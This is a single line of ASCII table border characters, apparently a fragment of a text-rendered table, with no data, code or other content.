+----------+--------------------+---------------------------------------------+

